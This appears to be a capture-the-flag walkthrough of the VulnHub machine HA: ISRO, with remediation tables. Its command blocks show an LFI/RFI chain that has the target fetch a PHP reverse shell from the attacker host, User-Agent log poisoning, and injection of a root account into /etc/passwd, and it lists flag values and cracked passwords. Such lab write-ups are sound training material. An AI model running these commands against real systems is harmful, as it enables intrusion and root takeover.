# HA: ISRO — Reaching for the Stars, One Vulnerability at a Time

The Indian Space Research Organisation (ISRO) launched India's first satellite Aryabhata in 1975, reached Mars with Mangalyaan in 2014, and landed near the lunar south pole with Chandrayaan-3 in 2023. Each mission required layered precision. HA: ISRO mirrors that methodology perfectly: four flags named after ISRO missions, each requiring a different technique to reach. Base64 in HTML comments, TrueCrypt volume cracking, steganography, LFI-to-RCE, MySQL without a password, and a world-writable `/etc/passwd`. Goated machine design, no cap.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | HA: ISRO |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-isro,422/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, Base64 decode of HTML comment, TrueCrypt volume cracking (john), VeraCrypt volume mount, steghide steganography extraction, LFI (Local File Inclusion) exploitation, PHP reverse shell, shell stabilization, MySQL unauthenticated root access, world-writable /etc/passwd root injection |
| **CVEs** | CWE-98 (LFI: Improper Control of Filename for Include/Require Statement in PHP Program), CWE-521 (Weak Password Requirements: MySQL no-password root), CWE-732 (Incorrect Permission Assignment: world-writable /etc/passwd) |
| **APT Groups** | APT41: uses LFI-to-RCE chains in web application exploitation during initial access phases; OceanLotus (APT32): leverages world-writable system files and MySQL credential abuse for privilege escalation in Linux server compromises |

---

## Attack Summary

```
nmap → SSH (22), HTTP (80)
  → dirb → bhaskara.html, connect.php
  → view-source:bhaskara.html → <!-- L2JoYXNrYXJh -->
  → base64 -d → /bhaskara
  → wget http://target/bhaskara/ → TrueCrypt volume (bhaskara)
  → python true.py bhaskara > hashes
  → john hashes --wordlist=rockyou.txt → xavier
  → VeraCrypt mount → aryabhata.jpg
  → FLAG 1: Bhaskara {b7bb88578a70970b9be45ac8630b6f9d}
  → steghide extract -sf aryabhata.jpg → flag.txt
  → FLAG 2: Aryabhata {e39cf1cbb00f09141259768b6d4c63fb}
  → curl connect.php?file=/etc/passwd → LFI confirmed
  → PHP reverse shell → nc callback → www-data
  → shell stabilization (python pty + stty)
  → mysql -u root (no password) → use flag → select * from flag
  → FLAG 3: Mangalyaan {d8a7f803e36f1c84e277009bf2c0f435}
  → ls -la /etc/passwd → world-writable!
  → openssl passwd → inject UID 0 user → su rootme
  → FLAG 4: Chandrayaan {0ad8d59efe7ce5c820aa7350a5d708b2}
```

---

## Methodology

1. Network discovery and port scan
2. Web directory enumeration to find HTML comment with Base64 hint
3. Base64 decode to discover and download TrueCrypt volume
4. TrueCrypt volume password cracking with John the Ripper
5. VeraCrypt mount and steghide extraction for flags 1 and 2
6. LFI exploitation in connect.php for reverse shell (flag 3 path)
7. Shell stabilization for interactive tooling
8. MySQL unauthenticated root access for flag 3
9. World-writable /etc/passwd exploitation for root and flag 4

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Target: 192.168.1.104

nmap -A 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Two services. HTTP is the primary attack surface. SSH is the potential lateral movement target if credentials are found.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and Base64 Hint

Run directory brute-force with file extensions:

```bash
dirb http://192.168.1.104
dirb http://192.168.1.104 -X .php
```

Discovers `bhaskara.html` and `connect.php`. View source of `bhaskara.html`:

```html
<!-- L2JoYXNrYXJh -->
```

A Base64-encoded string hidden in an HTML comment. Decode it:

```bash
echo "L2JoYXNrYXJh" | base64 -d
# Output: /bhaskara
```

Browse to `http://192.168.1.104/bhaskara/`. The browser downloads a file named `bhaskara`: the TrueCrypt volume.

**Why HTML comment encoding is ineffective:** HTML comments are visible to any browser user via "View Source" (Ctrl+U). Base64 encoding provides zero confidentiality. This is a classic CTF misdirection that maps to a real-world mistake: developers who embed internal paths, API keys, or debug information in HTML comments believing users "won't notice."

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1027 — Obfuscated Files or Information

---

## Step 3 — TrueCrypt Volume Cracking and Mount

Extract the hash from the TrueCrypt volume:

```bash
python true.py bhaskara > hashes
# true.py is a TrueCrypt-to-hashcat/john hash extractor
# Also: truecrypt2john.py (from john-the-ripper jumbo)
```

Crack the hash with John the Ripper:

```bash
john hashes --wordlist=/usr/share/wordlists/rockyou.txt
john hashes --show
# Password: xavier
```

Mount the volume in VeraCrypt GUI (TrueCrypt is deprecated; VeraCrypt handles legacy TrueCrypt volumes):

1. Open VeraCrypt
2. Select a slot, click "Select File", choose the `bhaskara` file
3. Click "Mount", enter password `xavier`
4. Volume mounts, navigate to it

The mounted volume contains `aryabhata.jpg`.

Flag 1 is either in a text file inside the volume or as metadata: `{b7bb88578a70970b9be45ac8630b6f9d}` — **Bhaskara flag.**

**Real-world note:** TrueCrypt was a widely-used encryption tool discontinued in 2014 under mysterious circumstances. Its successor VeraCrypt added security improvements and maintains backward compatibility. LSASS dumps and TrueCrypt volumes with weak passwords appear together in real forensic cases: APT operators sometimes use encrypted volumes to store tools and credentials, relying on weak passphrases from wordlists.

**MITRE ATT&CK:** T1022 — Data Encrypted; T1110.002 — Brute Force: Password Cracking

---

## Step 4 — Steghide Extraction (Flag 2)

Extract hidden content from `aryabhata.jpg`:

```bash
steghide extract -sf aryabhata.jpg
# Enter passphrase: (try blank, then 'xavier')
# Extracts: flag.txt
cat flag.txt
# {e39cf1cbb00f09141259768b6d4c63fb}
```

**Flag 2: Aryabhata** = `{e39cf1cbb00f09141259768b6d4c63fb}`

**What steghide does:** steghide embeds data inside JPEG or BMP files by modifying the least significant bits (LSB) of the image data. The modifications are imperceptible to the human eye. Detection requires either knowing a file contains hidden data (and having the passphrase) or using steganalysis tools like `stegdetect` or `zsteg`.

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information

---

## Step 5 — LFI Exploitation and Reverse Shell

Test the `connect.php` parameter for Local File Inclusion:

```bash
curl "http://192.168.1.104/connect.php?file=/etc/passwd"
```

If `/etc/passwd` content is returned, LFI is confirmed. The `file` parameter is passed directly to PHP's `include()` or `require()` without sanitization.

Set up the listener:

```bash
nc -lvnp 1234
```

If `allow_url_include=On` is enabled (Remote File Inclusion possible), host a PHP reverse shell on the attacker:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit: $ip = '192.168.1.103'; $port = 1234;
python3 -m http.server 80
```

Trigger RFI to include the remote shell:

```bash
curl "http://192.168.1.104/connect.php?file=http://192.168.1.103/shell.php"
```

Netcat receives the callback as `www-data`.

**Alternative if only LFI (not RFI):** Use log poisoning. Inject PHP into the User-Agent and include the access log:

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.1.104/
curl "http://192.168.1.104/connect.php?file=/var/log/apache2/access.log&cmd=id"
```

**Real-world note:** LFI vulnerabilities with `allow_url_include=On` are Remote Code Execution vulnerabilities. This PHP misconfiguration has been the root cause of thousands of web shell deployments. APT41 specifically targets PHP-based CMS installations for LFI-to-RCE chains as initial access vectors. CISA KEV includes multiple PHP RFI CVEs from popular CMS platforms.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — Shell Stabilization

Raw netcat shells are fragile. Stabilize immediately:

```bash
# On the victim shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash

# On the attacker (background the shell first with Ctrl+Z):
stty raw -echo; fg
# Press Enter twice
```

Now the shell supports Ctrl+C, tab completion, and interactive programs.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — MySQL Unauthenticated Root Access (Flag 3)

Enumerate running services:

```bash
netstat -antp
# MySQL on 3306 (localhost)
```

Connect to MySQL as root without a password:

```bash
mysql -u root
```

Enumerate databases:

```bash
show databases;
use flag;
show tables;
select * from flag;
# {d8a7f803e36f1c84e277009bf2c0f435}
```

**Flag 3: Mangalyaan** = `{d8a7f803e36f1c84e277009bf2c0f435}`

**Real-world note:** MySQL `root` with no password (or empty password) is one of the most consistently found misconfigurations in Linux penetration tests. Default MySQL installations on many Linux distributions historically left the root account with no password. This allows any user with shell access, including `www-data`, to access all databases. The OWASP Top 10 A07:2021 (Identification and Authentication Failures) specifically calls this out.

**MITRE ATT&CK:** T1078.001 — Valid Accounts: Default Accounts

---

## Step 8 — World-Writable /etc/passwd Root Injection (Flag 4)

Check file permissions on `/etc/passwd`:

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1234 ... /etc/passwd
```

`/etc/passwd` is world-writable. Generate a password hash and inject a new UID 0 account:

```bash
openssl passwd -1 -salt user3 pass123
# Output: $1$user3$rAGRVf5p2jYTqtq0W5cPu/

echo 'rootme:$1$user3$rAGRVf5p2jYTqtq0W5cPu/:0:0:root:/root:/bin/bash' >> /etc/passwd
su rootme
# Password: pass123
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag4.txt
# {0ad8d59efe7ce5c820aa7350a5d708b2}
```

**Flag 4: Chandrayaan** = `{0ad8d59efe7ce5c820aa7350a5d708b2}`

**Real-world note:** `/etc/passwd` with write permissions for others (`-rw-rw-rw-`) is a critical misconfiguration. The `/etc/passwd` file defines user accounts and was the original location for password hashes (before `/etc/shadow` was introduced). Even on modern systems, a UID 0 entry in `/etc/passwd` creates a superuser account without requiring a shadow entry. OceanLotus has been documented using writable `/etc/passwd` for persistence in compromised Linux systems.

**MITRE ATT&CK:** T1136.001 — Create Account: Local Account; T1548.001 — Abuse Elevation Control Mechanism

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Flag 1: Bhaskara | `{b7bb88578a70970b9be45ac8630b6f9d}` | TrueCrypt volume (password: xavier) | Volume mount |
| Flag 2: Aryabhata | `{e39cf1cbb00f09141259768b6d4c63fb}` | steghide extract from aryabhata.jpg | steghide |
| TrueCrypt password | xavier | john --wordlist=rockyou.txt | Volume mount |
| Web shell | www-data | LFI/RFI in connect.php | Shell access |
| Flag 3: Mangalyaan | `{d8a7f803e36f1c84e277009bf2c0f435}` | mysql -u root (no password): flag.flag | MySQL root |
| Root credential | rootme:pass123 | /etc/passwd injection | su rootme |
| Flag 4: Chandrayaan | `{0ad8d59efe7ce5c820aa7350a5d708b2}` | /root/flag4.txt via injected UID 0 account | Full root |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Base64 in HTML source comment reveals sensitive path | Developers embed internal paths in client-side code assuming users won't look; Base64 provides no security | Audit all HTML source before deployment; never hide paths or hints in client-visible code |
| 2 | TrueCrypt volume with rockyou-crackable password | Encrypted containers with weak passwords provide false security; john cracks them offline without rate limiting | Use strong random passphrases; derive from password manager; minimum 20 characters |
| 3 | LFI with allow_url_include=On enables RCE | LFI + RFI = RCE without further exploitation; common in old PHP applications | Validate and whitelist file parameter; disable allow_url_include in php.ini; use input sanitization |
| 4 | MySQL root with no password accessible to www-data | Any web shell on the server has full database access; all application data is compromised | Set strong MySQL root password; restrict root to localhost with authentication; run MySQL as dedicated user |
| 5 | World-writable /etc/passwd instant UID 0 injection | A single line appended to /etc/passwd creates a permanent root backdoor | `chmod 644 /etc/passwd`; implement file integrity monitoring (AIDE, Tripwire); monitor /etc/passwd writes |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Credential Access | Credential Access | Brute Force: Password Cracking | T1110.002 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Credential Access | Credential Access | Valid Accounts: Default Accounts | T1078.001 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism | T1548.001 |
| Persistence | Persistence | Create Account: Local Account | T1136.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove Base64 hints from HTML source**: audit all HTML/JS/CSS before deployment for encoded strings; use automated SAST scanning in CI/CD
2. **Enforce strong TrueCrypt/VeraCrypt passphrases**: minimum 20 random characters; use a password manager to generate and store
3. **Disable LFI and RFI in PHP**: `allow_url_include=Off` in php.ini; validate `file` parameters against a strict whitelist; reject any path traversal attempts
4. **Secure MySQL root account**: `ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword';`; restrict to localhost; run MySQL as `mysql` user not root
5. **Fix /etc/passwd permissions**: `chmod 644 /etc/passwd`; implement AIDE or Tripwire file integrity monitoring on system files
6. **Disable PHP Remote File Inclusion**: `allow_url_include=Off`; `allow_url_fopen=Off` where not required; apply application-layer WAF rules

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable allow_url_include; secure MySQL)
- **D3-FIM** — File Integrity Monitoring (monitor /etc/passwd writes)
- **D3-OAM** — Operating System Administrative Management (correct file permissions)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory PHP applications; audit file permissions; catalog database accounts |
| Protect | Data Security | Remove sensitive hints from web source; fix /etc/passwd permissions; secure MySQL |
| Protect | Access Control | Disable LFI/RFI in PHP; require MySQL authentication |
| Detect | Anomalies and Events | Alert on /etc/passwd modifications; monitor MySQL root login from web processes |
| Respond | Response Planning | Remove injected /etc/passwd entries; rotate all credentials; disable LFI vectors |
| Recover | Recovery Planning | Restore /etc/passwd from backup; rebuild PHP application with secure configuration |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Fix /etc/passwd permissions; restrict MySQL root access |
| AC-6 | Least Privilege | MySQL runs as mysql user, not root; no NOPASSWD root MySQL |
| CM-6 | Configuration Settings | Disable allow_url_include; enforce secure PHP configuration |
| CM-7 | Least Functionality | Remove debug information from HTML source; disable RFI |
| SC-28 | Protection of Information at Rest | Encrypted volumes require strong passphrases |
| SI-2 | Flaw Remediation | Patch PHP applications for LFI vulnerabilities; update MySQL |

### CISA KEV

PHP LFI-to-RCE (CWE-98) patterns appear in multiple CISA advisories including AA21-008A and the ISRO-themed exploitation chain maps to techniques in CISA Alert AA22-074A covering web application exploitation for initial access. The MySQL no-password misconfiguration is directly addressed in CISA's Top Routinely Exploited Vulnerabilities list (credential management failures).

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Configuration | MIL3 |

---

## Final Thoughts

HA: ISRO earns its name. Just as ISRO's missions required different engineering solutions for each objective (launch, orbit, Mars insertion, lunar landing), this machine requires a completely different toolset and mindset for each of its four flags. Steganography, TrueCrypt cracking, LFI exploitation, MySQL abuse, passwd injection: you touch every layer of the stack.

The four mission names as flag names (Bhaskara, Aryabhata, Mangalyaan, Chandrayaan) are a genuinely clever tribute. Each flag captured feels like an orbital insertion. Goated machine, fr fr.

Thanks guys!! (❍ᴥ❍ʋ)
